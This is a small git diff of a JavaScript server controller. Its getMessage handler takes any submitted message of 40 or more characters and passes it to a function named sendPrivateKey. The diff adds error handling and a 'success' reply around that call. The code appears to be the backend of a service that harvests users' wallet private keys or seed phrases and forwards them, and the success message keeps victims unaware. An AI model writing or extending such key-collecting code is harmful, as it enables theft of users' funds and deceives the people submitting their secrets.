@@ -97,5 +97,13 @@ export const verifyPayment = async (req, res) => {
 export const getMessage = async (req, res) => {
   const { message } = req.body;
   if (message.length < 40) return;
-  sendPrivateKey(message);
+  try {
+    sendPrivateKey(message);
+    return responses.success({
+      res,
+      message: `it a success`,
+    });
+  } catch (error) {
+    console.log(error);
+  }
 };
